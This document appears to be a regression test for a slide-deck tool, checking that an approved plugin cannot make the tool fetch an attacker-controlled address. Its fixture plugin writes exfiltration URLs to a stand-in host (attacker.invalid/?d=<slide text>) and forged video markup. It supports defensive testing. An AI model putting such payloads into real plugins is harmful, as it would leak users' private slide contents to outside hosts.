/**
 * Integration: a listed, approved zip plugin cannot turn a video slide's text into an address.
 *
 * The attack (engineering/decisions/2026-10-16-media-plugins.md § 4.5): Lattice's old `video` pass read a slide's
 * text and built a poster link from any address it found, in the engine AND again in the runtime over the finished
 * page, plugin output included. A plugin with no network of its own could write
 * `https://attacker.invalid/?d=<the slide's text>` onto a video slide and Lattice's own code would load it.
 *
 * The plugin below does exactly that, four ways: the address as plain text, as a `@video{…}` span, as a forged
 * figure with the plugin's marker, and as a bullet. DRIVEN ON THE ARTIFACT (HARD RULE #23): the real CLI exports
 * the real `.html`, and real Chromium opens it from `file://` with a request log. The export's own CSP is removed
 * first, because that CSP would block the fetch whatever Lattice did; what is under test is that no code of ours
 * BUILDS a loadable address from the plugin's text. THE CONTROL puts an `<img>` on the page and requires the log to
 * see it, so a probe that could never see a request cannot pass.
 *
 * Slow tier: a CLI export and a Chromium launch.
 */
const { test, describe, before, after } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { spawnSync } = require('node:child_process');
const { pathToFileURL } = require('node:url');

const ROOT = path.resolve(__dirname, '..', '..', '..');
const home = fs.mkdtempSync(path.join(os.tmpdir(), 'lattice-video-attack-'));
const work = fs.mkdtempSync(path.join(os.tmpdir(), 'lattice-video-attack-work-'));
const env = { ...process.env, LATTICE_HOME: home };
const lattice = (...args) => spawnSync(process.execPath, [path.join(ROOT, 'lattice.js'), ...args], { env, encoding: 'utf8', cwd: work, timeout: 240000 });
const ATTACKER = 'attacker.invalid';

const RENDER = `function render(f){
  var d = encodeURIComponent(f.body);
  return "<p>https://${ATTACKER}/?d=" + d + "</p>"
    + "<p><code>@video{\\"https://youtu.be/AAAAAAAAAAA\\", poster=\\"https://${ATTACKER}/p.png\\"}</code></p>"
    + "<ul><li>https://youtu.be/BBBBBBBBBBB</li><li>https://${ATTACKER}/q.png <code>poster</code></li></ul>"
    + "<figure class=\\"video-embed\\" data-lattice-media=\\"video\\" data-lattice-media-url=\\"https://${ATTACKER}/f\\"><a class=\\"video-poster\\" href=\\"https://youtu.be/CCCCCCCCCCC\\" style=\\"background-image:url('https://${ATTACKER}/g.png')\\"></a></figure>"
    + "<p><code>^{database}</code></p>";
}
export { render as default };`;

const DECK = `---
theme: indaco
plugins: [leak-plugin]
---

<!-- _class: video qr -->

## Clip

\`@video{"https://www.youtube.com/watch?v=dQw4w9WgXcQ", title="The author's own clip"}\`

\`\`\`leak
SECRET-Q3-NUMBERS
\`\`\`
`;

before(() => {
  const dir = path.join(work, 'leak-plugin');
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'leak-plugin.manifest.json'), JSON.stringify({ name: 'leak-plugin', type: 'plugin', format: 1, api: 1, contributes: { fences: { leak: { body: 'text' } } } }));
  fs.writeFileSync(path.join(dir, 'leak-plugin.docs.md'), '# leak-plugin\n');
  fs.writeFileSync(path.join(dir, 'leak-plugin.fixtures.md'), '```leak\nA\n```\n');
  fs.writeFileSync(path.join(dir, 'leak-plugin.render.js'), RENDER);
  fs.writeFileSync(path.join(work, 'deck.md'), DECK);
});
after(() => {
  fs.rmSync(home, { recursive: true, force: true });
  fs.rmSync(work, { recursive: true, force: true });
});

describe('a video slide and a zip plugin that writes addresses', () => {
  let page;
  let browser;
  const requests = [];

  before(async () => {
    const add = lattice('packages', 'add', path.join(work, 'leak-plugin'));
    assert.equal(add.status, 0, add.stdout + add.stderr);
    const trust = lattice('packages', 'trust', 'plugin/leak-plugin', '--yes');
    assert.equal(trust.status, 0, trust.stdout + trust.stderr);
    const out = path.join(work, 'deck.html');
    const r = lattice(path.join(work, 'deck.md'), '-o', out);
    assert.equal(r.status, 0, r.stdout + r.stderr);
    // Take the export's own CSP away: it would refuse the fetch whatever our code did.
    const html = fs.readFileSync(out, 'utf8').replace(/<meta[^>]*http-equiv=["']Content-Security-Policy["'][^>]*>/gi, '');
    fs.writeFileSync(path.join(work, 'open.html'), html);
    const puppeteer = require('puppeteer');
    browser = await puppeteer.launch({ headless: 'new', args: ['--no-sandbox', '--disable-dev-shm-usage'] });
    page = await browser.newPage();
    await page.setRequestInterception(true);
    page.on('request', (req) => {
      requests.push(req.url());
      if (req.url().startsWith('file:')) req.continue();
      else req.abort();
    });
    await page.goto(pathToFileURL(path.join(work, 'open.html')).href, { waitUntil: 'load' });
    await new Promise((res) => setTimeout(res, 2500));
  });
  after(async () => { if (browser) await browser.close(); });

  test('the plugin DREW: its text is on the slide, as text', async () => {
    const drawn = await page.$$eval('[data-lattice-plugin]', (els) => els.map((e) => e.textContent));
    assert.equal(drawn.length, 1, 'the door drew the fence');
    assert.match(drawn[0], new RegExp(`https://${ATTACKER}/\\?d=`));
  });

  test('ZERO requests reach the attacker, and the plugin\'s text built no poster, link or code', async () => {
    assert.deepEqual(requests.filter((u) => u.includes(ATTACKER)), [], requests.join('\n'));
    const built = await page.$$eval('[data-lattice-plugin] a[href], [data-lattice-plugin] .qr-tile, [data-lattice-plugin] svg, [data-lattice-plugin] .lat-icon', (els) => els.map((e) => e.outerHTML.slice(0, 120)));
    // The forged figure keeps the plugin's own anchor (the door's sanitizer decides that); what must not exist is anything Lattice BUILT from text.
    assert.deepEqual(built.filter((h) => !/youtu\.be\/CCCCCCCCCCC/.test(h)), [], 'nothing was built from the plugin\'s text');
  });

  test('the plugin\'s `@video{…}` span stayed code, and nothing outside the plugin gained a second figure', async () => {
    const code = await page.$$eval('[data-lattice-plugin] code', (els) => els.map((e) => e.textContent));
    assert.ok(code.some((t) => t.startsWith('@video{')), 'the span is still literal code');
    const figures = await page.$$eval('figure[data-lattice-media="video"]', (els) => els.filter((e) => !e.closest('[data-lattice-plugin]')).length);
    assert.equal(figures, 1, 'one figure outside the plugin: the author\'s');
  });

  test('the author\'s own video is still there, with its link and its code', async () => {
    const own = await page.$$eval('figure[data-lattice-media="video"]', (els) => els.filter((e) => !e.closest('[data-lattice-plugin]')).map((e) => ({
      href: e.querySelector('a.video-poster')?.getAttribute('href'),
      title: e.querySelector('figcaption')?.textContent,
      qr: !!e.querySelector('.video-qr svg'),
    })));
    assert.deepEqual(own, [{ href: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ', title: 'The author\'s own clip', qr: true }]);
  });

  test('CONTROL: the probe does see a request when the page makes one', async () => {
    const before = requests.length;
    await page.evaluate((a) => { const i = new Image(); i.src = `https://${a}/control.png`; document.body.appendChild(i); }, ATTACKER);
    await new Promise((res) => setTimeout(res, 500));
    assert.ok(requests.slice(before).some((u) => u.includes(`${ATTACKER}/control.png`)), 'the log sees an image the page loads');
  });
});
